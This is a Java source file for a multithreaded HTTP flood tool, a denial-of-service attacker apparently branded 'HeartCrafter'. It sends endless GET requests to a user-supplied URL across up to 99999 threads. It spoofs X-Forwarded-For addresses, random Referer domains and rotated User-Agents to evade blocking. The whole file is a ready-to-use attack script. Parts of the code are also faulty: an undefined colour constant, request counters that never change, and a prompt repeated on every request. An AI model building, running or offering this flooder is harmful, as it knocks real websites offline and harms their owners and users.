import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.ssl.HttpsURLConnection;

public class Dos implements Runnable {
    private static final String GREEN = "\033[0;32m";
    private static final String RED = "\033[0;31m";
    private static final String ORANGE = "\033[0;33m";
    private static final String CYAN = "\033[0;36m";
    private static final String WHITE = "\033[0;37m";
    private static final String RESET = "\033[0m";

    private static int amount = 0;
    private static String url = "";
    private static int successfulRequests = 0;
    private static int failedRequests = 0;

    private int seq;
    private int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public static String getRandomUserAgentFromFile() throws IOException {
        Scanner scanner = new Scanner(System.in);
        String defaultFileName = "useragent.txt";
        String filePath;

        // Prompt user for file name
        System.out.print(ORANGE + "Enter User Agent file name (or press Enter to use default " + defaultFileName + "): " + RESET);
        filePath = scanner.nextLine();

        // Use default file if no input provided
        if (filePath == null || filePath.trim().isEmpty()) {
            filePath = defaultFileName;
        }

        // Check if file exists
        File file = new File(filePath);
        if (!file.exists()) {
            System.out.println(RED + "Default file not found. Please provide the full path for the User Agent file." + RESET);
            System.out.print(ORANGE + "Enter the full path to the User Agent file: " + RESET);
            filePath = scanner.nextLine();
            file = new File(filePath);
            if (!file.exists()) {
                throw new FileNotFoundException("User agent file not found: " + filePath);
            }
        }

        List<String> userAgents = Files.readAllLines(Paths.get(filePath));
        Random random = new Random();
        return userAgents.get(random.nextInt(userAgents.size()));
    }

    public static String generateReferer() {
        Random random = new Random();
        int length = 6 + random.nextInt(9); // Random length between 6 and 14
        String domain = generateRandomString(length);
        String[] extensions = {".com", ".org", ".net", ".info", ".biz", ".us", ".co", ".uk", ".ca", ".de", ".jp", ".au", ".fr", ".it", ".nl", ".ru", ".ch", ".in", ".br", ".mx", ".kr", ".se", ".es", ".cn", ".tv", ".me", ".int", ".edu", ".gov", ".mil", ".name", ".pro", ".aero", ".museum", ".coop", ".jobs", ".tel", ".asia", ".cat", ".post", ".mobi", ".bz", ".ws", ".eu", ".cc", ".co.uk", ".us.com", ".uk.com", ".org.uk", ".net.uk", ".gov.uk", ".ltd.uk", ".pl", ".be", ".at", ".li", ".hu", ".sk", ".cz", ".ro", ".bg", ".gr", ".pt", ".tr", ".ae", ".sa", ".il", ".qa", ".om", ".kw", ".pk", ".bd", ".np", ".lk", ".sg", ".my", ".ph", ".id", ".vn", ".th", ".tw", ".hk", ".mo", ".pw", ".fm", ".am", ".ai", ".cv", ".dj", ".dm", ".gs", ".gy", ".ht", ".lc", ".mf", ".nu", ".re", ".sc", ".sr", ".st", ".su", ".tg", ".tk", ".tm", ".to", ".vg", ".vu", ".za", ".nom", ".space", ".fun", ".online", ".site", ".store", ".tech", ".app", ".design", ".club", ".blog", ".agency", ".company", ".inc", ".shop", ".travel", ".zone", ".rocks", ".love", ".guru", ".photo", ".pics", ".today", ".win", ".top", ".life", ".email"};
        
        String extension = extensions[random.nextInt(extensions.length)];
        return "https://www." + domain + extension;
    }

    private static String generateRandomString(int length) {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder(length);
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            sb.append(characters.charAt(random.nextInt(characters.length())));
        }
        return sb.toString();
    }

    public static Map<String, String> generateHeaders() {
        Map<String, String> headers = new HashMap<>();
        try {
            headers.put("User-Agent", getRandomUserAgentFromFile());
        } catch (IOException e) {
            System.out.println(RED + "Error reading User-Agent file: " + e.getMessage() + RESET);
            headers.put("User-Agent", "Mozilla/5.0"); // Fallback User-Agent
        }
        headers.put("X-Forwarded-For", generateRandomIP());
        headers.put("X-Forwarded-Proto", "https");
        headers.put("Accept", "*/*");
        headers.put("Accept-Charset", "UTF-8");
        headers.put("Accept-Encoding", "gzip, deflate, br");
        headers.put("Referer", generateReferer());
        return headers;
    }

    private static String generateRandomIP() {
        Random random = new Random();
        return random.nextInt(256) + "." +
               random.nextInt(256) + "." +
               random.nextInt(256) + "." +
               random.nextInt(256);
    }

    public static void main(String[] args) throws Exception {
        Dos dos = new Dos(0, 0);
        try (Scanner in = new Scanner(System.in)) {
            // Display Banner
            displayBanner();

            // User Input for URL
            System.out.print(ORANGE + "Kiss Me (url)🫣=> " + RESET);
            url = in.nextLine();
            if (!isValidURL(url)) {
                System.out.println(RED + "Invalid URL. Exiting." + RESET);
                return;
            }

            // User Input for Number of Threads
            System.out.print(ORANGE + "How Much U Love Me(thread)🤔 =>  " + RESET);
            String amountStr = in.nextLine();
            Dos.amount = (amountStr == null || amountStr.equals("")) ? 99999 : Integer.parseInt(amountStr);

            // Default to GET method
            int ioption = url.startsWith("http://") ? 3 : 4;

            System.out.println(WHITE + "Checking firewall status" + RESET);
            boolean isBlocked = firewallCheck(url);
            if (isBlocked) {
                System.out.println(RED + "Firewall detected." + RESET);
                return;
            }

            // Check Connection
            System.out.println(WHITE + "Checking connection to Site" + RESET);
            if (url.startsWith("http://")) {
                dos.checkConnection(url);
            } else {
                dos.sslCheckConnection(url);
            }

            Thread.sleep(2000);
            System.out.println(CYAN + "Starting Attack" + RESET);

            ExecutorService executor = Executors.newFixedThreadPool(Dos.amount);
            for (int i = 0; i < Dos.amount; i++) {
                executor.execute(new Dos(i, ioption));
            }
            executor.shutdown();
            while (!executor.isTerminated()) {
                // Wait for all threads to finish
            }
            System.out.println("Main Thread ended");

            // Save Log
            saveLog();
        }
    }

    @Override
    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;
                }
            }
        } catch (IOException e) {
            System.out.println(RED + "IO Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
        } catch (Exception e) {
            System.out.println(RED + "Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
        }
    }

    private static void displayBanner() {
        String banner = "\n" +
        "╭╮╱╭╮╱╱╱╱╱╱╱╭╮╭━━━╮╱╱╱╱╱╭━┳╮\n" +
        "┃┃╱┃┃╱╱╱╱╱╱╭╯╰┫╭━╮┃╱╱╱╱╱┃╭╯╰╮\n" +
        "┃╰━╯┣━━┳━━┳┻╮╭┫┃╱╰╋━┳━━┳╯╰╮╭╋━━┳━╮\n" +
        "┃╭━╮┃┃━┫╭╮┃╭┫┃┃┃╱╭┫╭┫╭╮┣╮╭┫┃┃┃━┫╭╯\n" +
        "┃┃╱┃┃┃━┫╭╮┃┃┃╰┫╰━╯┃┃┃╭╮┃┃┃┃╰┫┃━┫┃\n" +
        "╰╯╱╰┻━━┻╯╰┻╯╰━┻━━━┻╯╰╯╰╯╰╯╰━┻━━┻╯\n";
        System.out.println(CYAN + banner + RESET);
        System.out.println(ORANGE + "\n            Made By HeartCrafter             " + RESET);
        System.out.println(BLUE + "\n            t.me/heartcrafter            " + RESET);
    }

    private static boolean isValidURL(String url) {
        try {
            new URL(url).toURI();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void checkConnection(String url) throws Exception {
        System.out.println(ORANGE + "Checking Connection" + RESET);
        URL obj = new URL(url);
        HttpURLConnection con = createHttpURLConnection(obj);
        con.setRequestMethod("GET");
        Map<String, String> headers = generateHeaders();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }

        int responseCode = con.getResponseCode();
        printStatus(responseCode, "Connected to website");
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println(ORANGE + "Checking Connection (SSL)" + RESET);
        URL obj = new URL(url);
        HttpsURLConnection con = createHttpsURLConnection(obj);
        con.setRequestMethod("GET");
        Map<String, String> headers = generateHeaders();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }

        int responseCode = con.getResponseCode();
        printStatus(responseCode, "Connected to website (SSL)");
        Dos.url = url;
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = createHttpURLConnection(obj);
        con.setRequestMethod("GET");

        // Set headers for the request
        Map<String, String> headers = generateHeaders();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }

        // Send the request and get the response code
        int responseCode = con.getResponseCode();
        printStatus(responseCode, "GET attack done! Thread: " + this.seq);
    }

    private static void saveLog() {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter("LoveBite_log.txt", true))) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String timestamp = sdf.format(new Date());
            writer.write("Timestamp: " + timestamp);
            writer.newLine();
            writer.write("URL: " + url);
            writer.newLine();
            writer.write("Total Requests: " + Dos.amount);
            writer.newLine();
            writer.write("Successful Requests: " + successfulRequests);
            writer.newLine();
            writer.write("Failed Requests: " + failedRequests);
            writer.newLine();
            writer.write("=========================================");
            writer.newLine();
            System.out.println(GREEN + "Log saved successfully." + RESET);
        } catch (IOException e) {
            System.out.println(RED + "Failed to save log: " + e.getMessage() + RESET);
        }
    }

    private static boolean firewallCheck(String url) {
        HttpURLConnection connection = null;
        try {
            URL targetUrl = new URL(url);
            connection = (HttpURLConnection) targetUrl.openConnection();
            connection.setRequestMethod("HEAD"); // Use HEAD method to just check connectivity
            connection.setConnectTimeout(5000); // Set timeout for connection
            connection.setReadTimeout(5000); // Set timeout for reading

            int responseCode = connection.getResponseCode();
            return responseCode == HttpURLConnection.HTTP_FORBIDDEN; // HTTP 403 Forbidden can indicate a firewall block

        } catch (IOException e) {
            System.out.println(RED + "Error checking firewall: " + e.getMessage() + RESET);
            return false;
        } finally {
            if (connection != null) {
                connection.disconnect(); // Always disconnect
            }
        }
    }

    private HttpURLConnection createHttpURLConnection(URL url) throws IOException {
        return (HttpURLConnection) url.openConnection();
    }

    private HttpsURLConnection createHttpsURLConnection(URL url) throws IOException {
        return (HttpsURLConnection) url.openConnection();
    }

    private void printStatus(int responseCode, String message) {
        if (responseCode >= 200 && responseCode < 300) {
            System.out.println(GREEN + message + " - Response Code: " + responseCode + RESET);
        } else {
            System.out.println(RED + message + " - Response Code: " + responseCode + RESET);
        }
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = createHttpsURLConnection(obj);
        con.setRequestMethod("GET");

        // Set headers for the request
        Map<String, String> headers = generateHeaders();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }

        // Send the request and get the response code
        int responseCode = con.getResponseCode();
        printStatus(responseCode, "SSL GET attack done! Thread: " + this.seq);
    }
}